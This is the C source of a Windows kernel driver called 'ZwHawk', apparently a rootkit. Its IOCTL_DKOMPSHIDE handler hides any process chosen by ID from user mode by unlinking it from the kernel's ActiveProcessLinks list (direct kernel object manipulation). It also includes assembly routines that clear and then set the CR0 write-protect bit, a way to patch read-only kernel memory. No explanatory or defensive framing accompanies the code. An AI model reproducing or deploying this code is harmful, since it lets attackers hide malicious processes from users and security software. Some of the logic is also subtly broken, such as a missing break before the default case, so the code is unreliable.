//#include <wdm.h>
#include <Ntifs.h>

#define SIOCTL_TYPE 40000
#define IOCTL_BASIC CTL_CODE( SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_ECHO CTL_CODE( SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
#define IOCTL_DKOMPSHIDE CTL_CODE( SIOCTL_TYPE, 0x802, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

PDEVICE_OBJECT pDeviceObject;
UNICODE_STRING deviceNameUnicodeString = RTL_CONSTANT_STRING(L"\\Device\\zwhawk");
UNICODE_STRING deviceSymLinkUnicodeString = RTL_CONSTANT_STRING(L"\\DosDevices\\zwhawk");

NTSTATUS DDActive_Hide_Process(PDEVICE_OBJECT DeviceObject, PIRP irp, ULONG ProcessId) {
	PEPROCESS ProcessObject;
	PULONG pMemory;
	PLIST_ENTRY PrevListEntry, CurrListEntry, NextListEntry;
	NTSTATUS status;
	ULONG i, offset;
	offset = 0;
	status = PsLookupProcessByProcessId((HANDLE)ProcessId, &ProcessObject);
	if (status != STATUS_SUCCESS)
	{
		DbgPrint("ZwHawk - DDActive_Hide_Process - Error: Unable to open process object (%#x): Process ID: %d\n", status, ProcessId);
		status = STATUS_INSUFFICIENT_RESOURCES; 
		return status;
	}
	DbgPrint("ZwHawk - DDActive_Hide_Process - EPROCESS address: %#x", ProcessObject);
	pMemory = (PULONG)ProcessObject;
	for (i = 0; i<512; i++)
	{
		if (pMemory[i] == ProcessId)
		{
			// Get offset of ActiveProcessLinks from the beginning of EPROCESS structure
			offset = (ULONG)&pMemory[i + 1] - (ULONG)ProcessObject; // ActiveProcessLinks is located next to the PID
			DbgPrint("ZwHawk - DDActive_Hide_Process - ActiveProcessLinks offset: %#x", offset);
			break;
		}
	}
	if (!offset)
	{
		DbgPrint("ZwHawk - DDActive_Hide_Process - Unsucssefuly found offset: %#x", offset);
		status = STATUS_UNSUCCESSFUL;
		return status;
	}
	CurrListEntry = (PLIST_ENTRY)((PUCHAR)ProcessObject + offset); // Get the ActiveProcessLinks address
	PrevListEntry = CurrListEntry->Blink;
	NextListEntry = CurrListEntry->Flink;
	// Unlink the target process from other processes
	PrevListEntry->Flink = CurrListEntry->Flink;
	NextListEntry->Blink = CurrListEntry->Blink;
	// Point Flink and Blink to self
	CurrListEntry->Flink = CurrListEntry;
	CurrListEntry->Blink = CurrListEntry;
	// ObDereferenceObject decreases the reference count of an object by one. 
	ObDereferenceObject(ProcessObject); // Dereference the target process
	status = STATUS_SUCCESS;
	return status;
}

void DDDisableWP_CR0() {
	// clear WP bit, 0xFFFEFFFF = [1111 1111] [1111 1110] [1111 1111] [1111 1111]
	__asm {
		push ebx
		mov ebx, cr0
		and ebx, 0xFFFEFFFF
		mov cr0,ebx
		pop ebx
	}
	return;
}

void DDEnableWP_CR0() {
	// clear WP bit, 0x00010000 = [0000 0000] [0000 0001] [0000 0000] [0000 0000]
	__asm {
		push ebx
		mov ebx, cr0
		or ebx, 0x00010000
		mov cr0, ebx
		pop ebx
	}
	return;
}

void DDOnUnload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("ZwHawk - DDDeviceControl - OnUnload called!");
}

NTSTATUS DDDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP irp)
{
	NTSTATUS status;
	ANSI_STRING stringAnsi;
	UNICODE_STRING stringUnicode;
	ULONG ProcessId;
	PIO_STACK_LOCATION pIoStackLocation;
	void* pBuf;
	unsigned int outputLength;
	char* outputString = "Hello World!";
	outputLength = strlen(outputString) + 1;
	pIoStackLocation = IoGetCurrentIrpStackLocation(irp);
	DbgPrint("ZwHawk - DDDeviceControl - switch case\n");
	switch (pIoStackLocation->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_BASIC:
		DbgPrint("ZwHawk - DDDeviceControl - IOCTL_BASIC\n");
		irp->IoStatus.Status = STATUS_SUCCESS;
		irp->IoStatus.Information = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		pBuf = irp->AssociatedIrp.SystemBuffer;
		DbgPrint("ZwHawk - DDDeviceControl - Data from user:%s\n", pBuf);
		if (pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength < outputLength) {
			DbgPrint("ZwHawk - DDDeviceControl - OutputBufferLength size too small\n");
			status = STATUS_BUFFER_TOO_SMALL;
			irp->IoStatus.Status = status;
		}
		else {
			irp->IoStatus.Information = pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			RtlCopyMemory(pBuf, outputString, outputLength);
			DbgPrint("ZwHawk - DDDeviceControl - Data to user:%s\n", pBuf);
			status = STATUS_SUCCESS;
			irp->IoStatus.Status = STATUS_SUCCESS;
		}
		irp->IoStatus.Information = outputLength;
		break;
	case IOCTL_ECHO:
		DbgPrint("ZwHawk - DDDeviceControl - IOCTL_ECHO\n");
		irp->IoStatus.Status = STATUS_SUCCESS;
		irp->IoStatus.Information = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
		pBuf = irp->AssociatedIrp.SystemBuffer;
		DbgPrint("ZwHawk - DDDeviceControl - Data from user:%s\n", pBuf);
		if (pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength < outputLength) {
			DbgPrint("ZwHawk - DDDeviceControl - OutputBufferLength size too small\n");
			status = STATUS_BUFFER_TOO_SMALL;
			irp->IoStatus.Status = status;
		}
		else {
			irp->IoStatus.Information = pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
			DbgPrint("ZwHawk - DDDeviceControl - Data to user:%s\n", pBuf);
			status = STATUS_SUCCESS;
			irp->IoStatus.Status = STATUS_SUCCESS;
		}
		irp->IoStatus.Information = outputLength;
		break;
	case IOCTL_DKOMPSHIDE:
		DbgPrint("ZwHawk - DDDeviceControl - IOCTL_DKOMPSHIDE\n");
		pBuf = irp->AssociatedIrp.SystemBuffer;
		RtlInitAnsiString(&stringAnsi, (PCSZ)pBuf);
		RtlAnsiStringToUnicodeString(&stringUnicode, &stringAnsi, TRUE);
		status = RtlUnicodeStringToInteger(&stringUnicode, 10, &ProcessId);
		if (status != STATUS_SUCCESS) {
			irp->IoStatus.Status = status;
			break;
		}
		if (!ProcessId)
		{
			status = STATUS_INSUFFICIENT_RESOURCES; // 0xC000009A
			irp->IoStatus.Status = status;
			break;
		}
		status = DDActive_Hide_Process(DeviceObject, irp, ProcessId);
		if (status != STATUS_SUCCESS) {
			irp->IoStatus.Status = status;
			break;
		}
		irp->IoStatus.Information = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;

	default:
		DbgPrint("ZwHawk - DDDeviceControl - Unhandled IOCTL\n");
		status = STATUS_TIMEOUT;
		irp->IoStatus.Status = STATUS_TIMEOUT;
	}
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

NTSTATUS DDCreate(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
	DbgPrint("ZwHawk - DDCreate\n");
	return STATUS_SUCCESS;
}

NTSTATUS DDClose(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
	DbgPrint("ZwHawk - DDClose\n");
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	NTSTATUS ntStatus = 0;

	ntStatus = IoCreateDevice(pDriverObject, 0, &deviceNameUnicodeString, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
	ntStatus = IoCreateSymbolicLink(&deviceSymLinkUnicodeString, &deviceNameUnicodeString);

	pDriverObject->DriverUnload = DDOnUnload;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DDCreate;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DDClose;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DDDeviceControl;

	// Prevent other components from sending I/O to a device before the driver has
	// finished initializing the device object.
	pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	// Uses buffered I/O
	pDeviceObject->Flags |= DO_BUFFERED_IO;

	DbgPrint("ZwHawk - DriverEntry\n");
	return STATUS_SUCCESS;
}